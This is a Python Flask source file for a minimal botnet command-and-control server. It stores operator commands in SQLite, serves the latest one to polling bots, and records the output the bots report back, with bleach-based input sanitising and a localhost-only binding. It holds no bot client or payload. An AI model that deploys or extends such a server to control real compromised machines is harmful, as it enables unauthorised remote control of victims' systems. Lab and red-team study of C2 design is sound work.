from flask import Flask, request, render_template, abort
import sqlite3
import os
import bleach

app = Flask(__name__)
DB = "c2.db"

# Whitelist for allowed input tags (if any)
ALLOWED_TAGS = []
ALLOWED_ATTRS = {}

MAX_COMMAND_LENGTH = 500
MAX_NAME_LENGTH = 64
MAX_OUTPUT_LENGTH = 8192

def sanitize_input(value, max_length):
    if not value:
        return ""
    clean = bleach.clean(value.strip(), tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
    return clean[:max_length]

def init_db():
    with sqlite3.connect(DB) as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS bots (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            name TEXT,
                            output TEXT
                        )''')
        conn.execute('''CREATE TABLE IF NOT EXISTS commands (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            command TEXT
                        )''')
        conn.commit()

@app.route('/', methods=["GET"])
def index():
    with sqlite3.connect(DB) as conn:
        bots = conn.execute("SELECT * FROM bots ORDER BY id DESC").fetchall()
    return render_template("index.html", bots=bots)

@app.route('/send_command', methods=["POST"])
def send_command():
    raw_command = request.form.get("command", "")
    command = sanitize_input(raw_command, MAX_COMMAND_LENGTH)
    if not command:
        abort(400, "Invalid command")

    with sqlite3.connect(DB) as conn:
        conn.execute("INSERT INTO commands (command) VALUES (?)", (command,))
        conn.commit()
    return "Command sent. <a href='/'>Back</a>"

@app.route('/get_command', methods=["GET"])
def get_command():
    with sqlite3.connect(DB) as conn:
        result = conn.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1").fetchone()
    return result[1] if result else ""

@app.route('/submit_output', methods=["POST"])
def submit_output():
    raw_name = request.form.get("name", "")
    raw_output = request.form.get("output", "")

    name = sanitize_input(raw_name, MAX_NAME_LENGTH)
    output = sanitize_input(raw_output, MAX_OUTPUT_LENGTH)

    if not name or not output:
        abort(400, "Missing or invalid name/output")

    with sqlite3.connect(DB) as conn:
        conn.execute("INSERT INTO bots (name, output) VALUES (?, ?)", (name, output))
        conn.commit()
    return "OK"

if __name__ == '__main__':
    init_db()
    app.run(host='127.0.0.1', port=8080)
